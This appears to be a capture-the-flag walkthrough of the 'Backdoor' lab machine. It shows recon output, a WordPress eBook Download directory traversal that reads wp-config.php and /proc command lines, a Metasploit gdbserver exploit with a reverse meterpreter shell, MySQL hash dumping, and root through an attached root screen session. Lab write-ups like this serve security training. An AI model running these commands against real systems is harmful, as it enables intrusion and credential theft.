# Backdoor

First as usual, `nmap`

```
# Nmap 7.92 scan initiated Sun Nov 21 14:09:02 2021 as: nmap -vvv -p 22,80,1337 -sCV -oA init 10.129.235.196
Nmap scan report for 10.129.235.196
Host is up, received syn-ack (0.25s latency).
Scanned at 2021-11-21 14:09:09 +07 for 25s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqz2EAb2SBSzEIxcu+9dzgUZzDJGdCFWjwuxjhwtpq3sGiUQ1jgwf7h5BE+AlYhSX0oqoOLPKA/QHLxvJ9sYz0ijBL7aEJU8tYHchYMCMu0e8a71p3UGirTjn2tBVe3RSCo/XRQOM/ztrBzlqlKHcqMpttqJHphVA0/1dP7uoLCJlAOOWnW0K311DXkxfOiKRc2izbgfgimMDR4T1C17/oh9355TBgGGg2F7AooUpdtsahsiFItCRkvVB1G7DQiGqRTWsFaKBkHPVMQFaLEm5DK9H7PRwE+UYCah/Wp95NkwWj3u3H93p4V2y0Y6kdjF/L+BRmB44XZXm2Vu7BN0ouuT1SP3zu8YUe3FHshFIml7Ac/8zL1twLpnQ9Hv8KXnNKPoHgrU+sh35cd0JbCqyPFG5yziL8smr7Q4z9/XeATKzL4bcjG87sGtZMtB8alQS7yFA6wmqyWqLFQ4rpi2S0CoslyQnighQSwNaWuBYXvOLi6AsgckJLS44L8LxU4J8=
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIuoNkiwwo7nM8ZE767bKSHJh+RbMsbItjTbVvKK4xKMfZFHzroaLEe9a2/P1D9h2M6khvPI74azqcqnI8SUJAk=
|   256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7eoJSCw4DyNNaFftGoFcX4Ttpwf+RPo0ydNk7yfqca
80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
|_http-generator: WordPress 5.8.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
1337/tcp open  waste?  syn-ack
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov 21 14:09:34 2021 -- 1 IP address (1 host up) scanned in 31.87 seconds
```

Connecting to port 1337 with `telnet` or `nc` doesn't tell us anything about the service so we'll look at the Wordpress site on port 80 first.

```
$ wpscan --url http://10.129.235.196/ -e ap,at,tt,cb,dbe,u1-5,m1-5 --plugins-detection mixed

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.129.235.196/ [10.129.235.196]
[+] Started: Sun Nov 21 14:26:55 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.129.235.196/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.129.235.196/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.129.235.196/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.129.235.196/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8.1 identified (Latest, released on 2021-09-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.129.235.196/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
 |  - http://10.129.235.196/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://10.129.235.196/wp-content/themes/twentyseventeen/
 | Latest Version: 2.8 (up to date)
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.129.235.196/wp-content/themes/twentyseventeen/readme.txt
 | Style URL: http://10.129.235.196/wp-content/themes/twentyseventeen/style.css?ver=20201208
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.129.235.196/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://10.129.235.196/wp-content/plugins/akismet/
 | Latest Version: 4.1.12
 | Last Updated: 2021-09-03T16:53:00.000Z
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.129.235.196/wp-content/plugins/akismet/, status: 403
 |
 | The version could not be determined.

[+] ebook-download
 | Location: http://10.129.235.196/wp-content/plugins/ebook-download/
 | Last Updated: 2020-03-12T12:52:00.000Z
 | Readme: http://10.129.235.196/wp-content/plugins/ebook-download/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.129.235.196/wp-content/plugins/ebook-download/, status: 200
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.129.235.196/wp-content/plugins/ebook-download/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.129.235.196/wp-content/plugins/ebook-download/readme.txt

[i] Theme(s) Identified:

[+] twentynineteen
 | Location: http://10.129.235.196/wp-content/themes/twentynineteen/
 | Latest Version: 2.1 (up to date)
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.129.235.196/wp-content/themes/twentynineteen/readme.txt
 | Style URL: http://10.129.235.196/wp-content/themes/twentynineteen/style.css
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.129.235.196/wp-content/themes/twentynineteen/, status: 500
 |
 | Version: 2.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.129.235.196/wp-content/themes/twentynineteen/style.css, Match: 'Version: 2.1'

[+] twentyseventeen
 | Location: http://10.129.235.196/wp-content/themes/twentyseventeen/
 | Latest Version: 2.8 (up to date)
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.129.235.196/wp-content/themes/twentyseventeen/readme.txt
 | Style URL: http://10.129.235.196/wp-content/themes/twentyseventeen/style.css
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://10.129.235.196/wp-content/themes/twentyseventeen/, status: 500
 |
 | Version: 2.8 (80% confidence)
 | Found By: Style (Aggressive Detection)
 |  - http://10.129.235.196/wp-content/themes/twentyseventeen/style.css, Match: 'Version: 2.8'

[+] twentytwenty
 | Location: http://10.129.235.196/wp-content/themes/twentytwenty/
 | Latest Version: 1.8 (up to date)
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.129.235.196/wp-content/themes/twentytwenty/readme.txt
 | Style URL: http://10.129.235.196/wp-content/themes/twentytwenty/style.css
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.129.235.196/wp-content/themes/twentytwenty/, status: 500
 |
 | Version: 1.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.129.235.196/wp-content/themes/twentytwenty/style.css, Match: 'Version: 1.8'

[+] twentytwentyone
 | Location: http://10.129.235.196/wp-content/themes/twentytwentyone/
 | Latest Version: 1.4 (up to date)
 | Last Updated: 2021-07-22T00:00:00.000Z
 | Readme: http://10.129.235.196/wp-content/themes/twentytwentyone/readme.txt
 | Style URL: http://10.129.235.196/wp-content/themes/twentytwentyone/style.css
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.129.235.196/wp-content/themes/twentytwentyone/, status: 500
 |
 | Version: 1.4 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.129.235.196/wp-content/themes/twentytwentyone/style.css, Match: 'Version: 1.4'

[i] No Timthumbs Found.

[i] No Config Backups Found.

[i] No DB Exports Found.

[i] No Medias Found.

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.129.235.196/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
```

I also ran `gobuster` on the site.

```
$ gobuster dir -u http://10.129.235.196/ -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -r
/index.php            (Status: 200) [Size: 63888]
/wp-content           (Status: 200) [Size: 0]
/wp-login.php         (Status: 200) [Size: 5716]
/wp-includes          (Status: 200) [Size: 52161]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-admin             (Status: 200) [Size: 5716]
/xmlrpc.php           (Status: 405) [Size: 42]
/wp-signup.php        (Status: 200) [Size: 5882]
/server-status        (Status: 403) [Size: 279]
```

Looking around the page, we can see that the "Home" button points to `backdoor.htb` so we add that to our `/etc/hosts`. Looking back at the `wpscan` results, we have an out-of-date version of the `ebook-download` plugin so we look for exploits for it.

```sh
$ searchsploit ebook download
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path
------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin eBook Download 1.1 - Directory Traversal                            | php/webapps/39575.txt
------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

We have directory traversal. With `/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php`, we can grab the configuration file. Within the config is credentials.

```php
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );
```

We can't use those credentials to log into Wordpress, however. I also tried using them on port 1337 but to no avail.

```sh
$ telnet backdoor.htb 1337
Trying 10.129.238.61...
Connected to backdoor.htb.
Escape character is '^]'.
wordpressuser
MQYBJSaD#DxG6qbm
```

```sh
$ telnet backdoor.htb 1337
Trying 10.129.238.61...
Connected to backdoor.htb.
Escape character is '^]'.
MQYBJSaD#DxG6qbm
```

Exfiltrating `/etc/passwd`, we get the user `user`.

```sh
$ cat passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:user:/home/user:/bin/bash
```

I then tried to SSH in as `user` with the previously found password but that didn't work either. I also tried exfiltrating user's SSH key which also didn't work.

I then exfiltrated running command-line programs.

```sh
$ seq 1 1000 | while read line; do curl "backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../proc/$line/cmdline" -s > $line; done
```

Looking for port 1337, we can find `gdbserver` is running.

```sh
$ strings * | grep 1337
while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
```

Looking up `gdbserver` in `msfconsole`, we get an exploit.

```
msf6 > search gdbserver

Matching Modules
================

   #  Name                               Disclosure Date  Rank   Check  Description
   -  ----                               ---------------  ----   -----  -----------
   0  exploit/multi/gdb/gdb_server_exec  2014-08-24       great  No     GDB Server Remote Payload Execution
```

```
msf6 exploit(multi/gdb/gdb_server_exec) > set rhosts backdoor.htb
msf6 exploit(multi/gdb/gdb_server_exec) > set rport 1337
msf6 exploit(multi/gdb/gdb_server_exec) > set lhost tun0
msf6 exploit(multi/gdb/gdb_server_exec) > set payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/gdb/gdb_server_exec) > run
```

Running the exploit should give us a meterpreter shell on the machine. After getting a shell, I put my SSH key on the machine to get an SSH shell.

Looking at listening ports ...

```sh
user@Backdoor:~$ ss -tlnp
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port   Process
LISTEN    0         151              127.0.0.1:3306             0.0.0.0:*
LISTEN    0         4096         127.0.0.53%lo:53               0.0.0.0:*
LISTEN    0         128                0.0.0.0:22               0.0.0.0:*
LISTEN    0         1                  0.0.0.0:1337             0.0.0.0:*       users:(("gdbserver",pid=82093,fd=3))
LISTEN    0         70               127.0.0.1:33060            0.0.0.0:*
LISTEN    0         511                      *:80                     *:*
LISTEN    0         128                   [::]:22                  [::]:*
```

We have MySQL running on port 3306 which we can connect to using wordpressuser's previously found credentials.

```sh
user@Backdoor:~$ mysql -u wordpressuser -p
```

Looking around the `wordpress` database, we can find admin's password hash.

```
mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email          | user_url            | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+---------------------+-------------+--------------+
|  1 | admin      | $P$Bt8c3ivanSGd2TFcm3HV/9ezXPueg5. | admin         | admin@wordpress.com | http://backdoor.htb | 2021-07-24 13:19:11 |                     |           0 | admin        |
+----+------------+------------------------------------+---------------+---------------------+---------------------+---------------------+---------------------+-------------+--------------+
```

I tried cracking the hash with rockyou but got nothing. I then ran linpeas. Among the running processes is `screen` run by root.

```
root         955  0.0  0.0   2608  1760 ?        Ss   Nov22   0:16      _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done
```

We can attach root's `screen` with `screen -r root/root` and root the box.
